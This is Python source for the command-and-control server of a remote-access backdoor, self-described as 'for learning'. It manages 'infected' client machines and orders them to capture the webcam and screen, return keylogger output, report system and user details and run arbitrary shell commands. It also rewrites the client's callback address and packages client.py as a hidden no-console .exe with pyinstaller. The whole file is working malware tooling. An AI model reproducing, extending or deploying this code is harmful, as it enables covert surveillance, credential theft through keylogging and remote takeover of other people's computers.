import socket
import threading
import pickle
import time
from PIL import Image
import os

IP = '127.0.0.1'
PORT = 8888
VERSION = 0.1
MODE = 'Menu'
MENU = ['Camera Capture', 'Screen Capture', 'Keylog', 'Computer Information', 'Change Wallpaper', 'Command', 'Server File Management', 'Infected Client', '.exe File Creation', 'Exit']
CAMERA_CAPTURE = ['Start', 'Stop', 'Capture']
SCREEN_CAPTURE = ['Start', 'Stop', 'Capture']
KEYLOG = ['Listening', 'Save']
COMPUTER_INFORMATION = ['Show']
CHANGE_WALLPAPER = ['Apply']
COMMAND = ['RCE']
SERVER_FILE = ['Show', 'Change Ip', 'Change Port']
EXE_FILE = ['File Creation']

running = True
camera_capture_recv_running = False
screen_capture_recv_running = False

connected_clients = {}
connected_client_ip = None
connected_client_port = None
connected_client_socket = None

def recvall(n):
    data = bytearray()
    while len(data) < n:
        packet = connected_client_socket.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def send(send_data):
    data = pickle.dumps(send_data)
    length = len(data)
    connected_client_socket.sendall(length.to_bytes(4, byteorder="little"))
    connected_client_socket.sendall(data)

def recv():
    data = connected_client_socket.recv(4)	
    length = int.from_bytes(data, "little")
    buf = recvall(length)
    recv_data = pickle.loads(buf)
    return recv_data

def init():
    global connected_clients
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((IP, PORT))
    server_socket.listen()

    while True:
        client_socket, socket_address = server_socket.accept()
        client_socket.settimeout(5.0)
        connected_clients[str(socket_address[0])+':'+str(socket_address[1])] = client_socket

def print_logo():
    print('''
______               _                                   
| ___ \             | |                                  
| |_/ /  __ _   ___ | | __ _ __   ___    ___   _ __ ___  
| ___ \ / _` | / __|| |/ /| '__| / _ \  / _ \ | '_ ` _ \ 
| |_/ /| (_| || (__ |   < | |   | (_) || (_) || | | | | |
\____/  \__,_| \___||_|\_\|_|    \___/  \___/ |_| |_| |_|
=> Backdoor Ctl Program For Learning
=> Version {0} By yc54616
=> Server Ip : {1}
=> Server Port : {2}'''.format(VERSION, IP, PORT)) 

def menu():
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(MENU):
        print(f'[{i[0]}] {i[1]}')
    print('====================================\n')

def select():
    global running, MODE
    try:
        select = int(input('> '))
        MODE = MENU[select]
        if MODE == MENU[0]:
            camera_capture_logo()
        elif MODE == MENU[1]:
            screen_capture_logo()
        elif MODE == MENU[2]:
            keylog_logo()
        elif MODE == MENU[3]:
            computer_information_logo()
        elif MODE == MENU[4]:
            change_wallpaper_logo()
        elif MODE == MENU[5]:
            command_logo()
        elif MODE == MENU[6]:
            server_file_management_logo()
        elif MODE == MENU[7]:
            infected_client_logo()
        elif MODE == MENU[8]:
            exe_file_creation_logo()
        elif MODE == MENU[9]:
            running = False
    except:
        print("[-] Can't Select")

def camera_capture_recv():
    global camera_capture_recv_running
    print("[+] Start Camera Capture")
    camera_capture_recv_running = True
    while camera_capture_recv_running:
        try:
            send('camera_capture')
            recv_data = recv()
            recv_data.save(f'camera_capture {time.localtime().tm_year}-{time.localtime().tm_mon}-{time.localtime().tm_mday} {time.localtime().tm_hour}{time.localtime().tm_min}{time.localtime().tm_sec}{time.localtime().tm_wday}{time.localtime().tm_yday}{time.localtime().tm_isdst}.png')
            print('[+] Success Camera Capture!')
        except Exception as e:
            print('[-] Error : {}'.format(e))
            camera_capture_recv_running = False
    print("[+] End Camera Capture")
def camera_capture_logo():
    menu_num = len(CAMERA_CAPTURE)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(CAMERA_CAPTURE):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    camera_capture(menu_num)
def camera_capture(menu_num):
    global MODE, camera_capture_recv_running
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                camera_capture_recv_running = False
                break
            elif CAMERA_CAPTURE[select] == CAMERA_CAPTURE[0]:
                camera_capture_recver = threading.Thread(target=camera_capture_recv)
                camera_capture_recver.daemon = True
                camera_capture_recver.start()
            elif CAMERA_CAPTURE[select] == CAMERA_CAPTURE[1]:
                camera_capture_recv_running = False
            elif CAMERA_CAPTURE[select] == CAMERA_CAPTURE[2]:
                try:
                    print("[+] Start Camera Capture")

                    send('camera_capture')
                    print('[*] Send Data : camera_capture')
                    
                    recv_data = recv()
                    print('[*] Recv Data : camera_capture')
                    
                    recv_data.save(f'camera_capture {time.localtime().tm_year}-{time.localtime().tm_mon}-{time.localtime().tm_mday} {time.localtime().tm_hour}{time.localtime().tm_min}{time.localtime().tm_sec}{time.localtime().tm_wday}{time.localtime().tm_yday}{time.localtime().tm_isdst}.png')
                    print('[+] Success Camera Capture!')
                except Exception as e:
                    print('[-] Error : {}'.format(e))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

def screen_capture_recv():
    global screen_capture_recv_running
    print("[+] Start Screen Capture")
    screen_capture_recv_running = True
    while screen_capture_recv_running:
        try:
            send('screen_capture')
            recv_data = recv()
            recv_data.save(f'screen_capture {time.localtime().tm_year}-{time.localtime().tm_mon}-{time.localtime().tm_mday} {time.localtime().tm_hour}{time.localtime().tm_min}{time.localtime().tm_sec}{time.localtime().tm_wday}{time.localtime().tm_yday}{time.localtime().tm_isdst}.png')
            print('[+] Success Screen Capture!')
        except Exception as e:
            print('[-] Error : {}'.format(e))
            screen_capture_recv_running = False
    print("[+] End Screen Capture")
def screen_capture_logo():
    menu_num = len(SCREEN_CAPTURE)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(SCREEN_CAPTURE):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    screen_capture(menu_num)
def screen_capture(menu_num):
    global MODE, screen_capture_recv_running
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                screen_capture_recv_running = False
                break
            elif SCREEN_CAPTURE[select] == SCREEN_CAPTURE[0]:
                screen_capture_recver = threading.Thread(target=screen_capture_recv)
                screen_capture_recver.daemon = True
                screen_capture_recver.start()
            elif SCREEN_CAPTURE[select] == SCREEN_CAPTURE[1]:
                screen_capture_recv_running = False
            elif SCREEN_CAPTURE[select] == SCREEN_CAPTURE[2]:
                try:
                    print("[+] Start Screen Capture")
                    
                    send('screen_capture')
                    print('[*] Send Data : screen_capture')
                    
                    recv_data = recv()
                    print('[*] Recv Data : screen_capture')
                    
                    recv_data.save(f'screen_capture {time.localtime().tm_year}-{time.localtime().tm_mon}-{time.localtime().tm_mday} {time.localtime().tm_hour}{time.localtime().tm_min}{time.localtime().tm_sec}{time.localtime().tm_wday}{time.localtime().tm_yday}{time.localtime().tm_isdst}.png')
                    print('[+] Success Screen Capture!')
                except Exception as e:
                    print('[-] Error : {}'.format(e))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

def keylog_logo():
    menu_num = len(KEYLOG)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(KEYLOG):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    keylog(menu_num)
def keylog(menu_num):
    global MODE
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                break
            elif KEYLOG[select] == KEYLOG[0]:
                try:
                    print("[+] Start Listening Keylog")

                    send('keylog_listening')
                    print('[*] Send Data : keylog_listening')

                    recv_data = recv()
                    print('[*] Recv Data : keylog_listening')

                    for i in recv_data:
                        print("[*] {}".format(i))
                    print("[+] End Listening Keylog")
                except Exception as e:
                    print('[-] Error : {}'.format(e))
                
            elif KEYLOG[select] == KEYLOG[1]:
                try:
                    print("[+] Start Save Keylog")

                    send('keylog_save')
                    print('[*] Send Data : keylog_save')

                    recv_data = recv()
                    print('[*] Recv Data : keylog_save')

                    with open(f'keylog {time.localtime().tm_year}-{time.localtime().tm_mon}-{time.localtime().tm_mday} {time.localtime().tm_hour}{time.localtime().tm_min}{time.localtime().tm_sec}{time.localtime().tm_wday}{time.localtime().tm_yday}{time.localtime().tm_isdst}.txt', 'w') as f:
                        f.write('\n'.join(recv_data))
                    print("[+] End Save Keylog")
                except Exception as e:
                    print('[-] Error : {}'.format(e))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

def computer_information_logo():
    menu_num = len(COMPUTER_INFORMATION)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(COMPUTER_INFORMATION):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    computer_information(menu_num)
def computer_information(menu_num):
    global MODE
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                break
            elif COMPUTER_INFORMATION[select] == COMPUTER_INFORMATION[0]:
                try:
                    send('computer_information')
                    recv_data = recv()
                    print('[*] OS : {}'.format(recv_data[0]))
                    print('[*] OS Version : {}'.format(recv_data[1]))
                    print('[*] Process information : {}'.format(recv_data[2]))
                    print('[*] Process Cores : {}'.format(recv_data[3]))
                    print('[*] Process Architecture : {}'.format(recv_data[4]))
                    print('[*] RAM Size : {}'.format(recv_data[5]))
                    print('[*] Host Name : {}'.format(recv_data[6]))
                    print('[*] User Name : {}'.format(recv_data[7]))

                except Exception as e:
                    print('[-] Error : {}'.format(e))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

def change_wallpaper_logo():
    menu_num = len(COMPUTER_INFORMATION)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(CHANGE_WALLPAPER):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    change_wallpaper(menu_num)
def change_wallpaper(menu_num):
    global MODE
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                break
            elif CHANGE_WALLPAPER[select] == CHANGE_WALLPAPER[0]:
                try:
                    print("[+] Start Change Wallpaper")
                    img = Image.open('1750670.jpg')
                    send(('change_wallpaper', img))
                    recv_data = recv()
                    if recv_data == 'success!':
                        print("[+] End Change Wallpaper")
                except Exception as e:
                    print('[-] Error : {}'.format(e))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()
    
def command_logo():
    menu_num = len(COMMAND)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(COMMAND):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    command(menu_num)
def command(menu_num):
    global MODE
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                break
            elif COMMAND[select] == COMMAND[0]:
                try:
                    send('connected?')
                    recv_data = recv()
                    if recv_data == 'success!':
                        while True:
                            rce = input('[RCE] $ ')
                            if rce == 'exit':
                                break
                            send(('command', rce))
                            recv_data = recv()
                            print(recv_data)
                except Exception as e:
                    print('[-] Error : {}'.format(e))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

def server_file_management_logo():
    menu_num = len(SERVER_FILE)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(SERVER_FILE):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    server_file_management(menu_num)
def server_file_management(menu_num):
    global MODE, IP, PORT
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                break
            elif SERVER_FILE[select] == SERVER_FILE[0]:
                with open('client.py','r') as f:
                    lines = f.readlines()
                    for l in lines:
                        new_string = l.rstrip()
                        if 'IP = ' in new_string:
                            print('[+] Current Client {}'.format(new_string))
                        if 'PORT = ' in new_string:
                            print('[+] Current Client {}'.format(new_string))
                            break
            elif SERVER_FILE[select] == SERVER_FILE[1]:
                print('[+] Match the server IP with the client.py file IP!')
                with open('client.py','r') as f:
                    lines = f.readlines()
                    for l in lines:
                        new_string = l.rstrip()
                        if 'IP = ' in new_string:
                            print('[+] Current Client {}'.format(new_string))
                            break
                change_ip = input('[*] Change Server Ip : ')
                new_text_content = ''
                new_word = "IP = '{}'".format(change_ip)
                with open('client.py','r') as f:
                    lines = f.readlines()
                    for l in lines:
                        new_string = l.rstrip()
                        if new_string:
                            if 'IP = ' in new_string:
                                new_text_content += new_word + '\n'
                            else:
                                new_text_content += new_string + '\n'
                        else:
                            new_text_content += '\n'
                with open('client.py','w') as f:
                    f.write(new_text_content)
                print('[+] Change Server Ip : {}'.format(change_ip))
            elif SERVER_FILE[select] == SERVER_FILE[2]:
                print('[+] Match the server.py file PORT with the client.py file PORT!')
                with open('client.py','r') as f:
                    lines = f.readlines()
                    for l in lines:
                        new_string = l.rstrip()
                        if 'PORT = ' in new_string:
                            print('[+] Current Client {}'.format(new_string))
                            break
                change_port = input('[*] Change Server Port : ')
                new_text_content = ''
                new_word = "PORT = {}".format(change_port)
                with open('client.py','r') as f:
                    lines = f.readlines()
                    for l in lines:
                        new_string = l.rstrip()
                        if new_string:
                            if 'PORT = ' in new_string:
                                new_text_content += new_word + '\n'
                            else:
                                new_text_content += new_string + '\n'
                        else:
                            new_text_content += '\n'
                with open('client.py','w') as f:
                    f.write(new_text_content)
                print('[+] Change Server Port : {}'.format(change_port))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

def infected_client_logo():
    menu_num = len(connected_clients)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(connected_clients.keys()):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    infected_client(menu_num)
def infected_client(menu_num):
    global MODE, connected_client_ip, connected_client_port, connected_client_socket
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                break
            print("[*] Connecting {}...".format(list(connected_clients.keys())[select]))
            try:
                connected_client_ip = list(connected_clients.keys())[select].split(':')[0]
                connected_client_port = list(connected_clients.keys())[select].split(':')[1]
                connected_client_socket = connected_clients[list(connected_clients.keys())[select]]
                send('connected?')
                print('[*] Send Data : connected?')
                
                recv_data = recv()
                if recv_data == 'success!':
                    print('[*] Recv Data : success!')
                    print("[+] {} Connected!".format(list(connected_clients.keys())[select]))
            except Exception as e:
                print('[-] Error : {}'.format(e))
                connected_client_ip = None
                connected_client_port = None
                connected_client_socket = None
                del connected_clients[list(connected_clients.keys())[select]]
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

def exe_file_creation_logo():
    menu_num = len(EXE_FILE)
    print('\n====================================')
    print('Current Mode : {}'.format(MODE))
    print('=> Connected Client Ip : {}'.format(connected_client_ip))
    print('=> Connected Client Port : {}'.format(connected_client_port))
    print('------------------------------------')
    for i in enumerate(EXE_FILE):
        print(f'[{i[0]}] {i[1]}')
    print('[{}] Menu'.format(menu_num))
    print('====================================\n')
    exe_file_creation(menu_num)
def exe_file_creation(menu_num):
    global MODE
    while True:
        try:
            select = int(input('> '))
            if select == menu_num:
                break
            elif EXE_FILE[select] == EXE_FILE[0]:
                try:
                    print('[*] Start .exe File Creation')
                    os.system("pyinstaller --onefile --noconsole client.py")
                    print('[*] End .exe File Creation')
                except Exception as e:
                    print('[-] Error : {}'.format(e))
        except:
            print("[-] Can't Select")
    print("[+] Return Menu")
    MODE = 'Menu'
    menu()

if __name__ == '__main__':
    initer = threading.Thread(target=init)
    initer.daemon = True
    initer.start()
    print_logo()
    menu()
    while running:
        select()
    print('[+] Exit')
    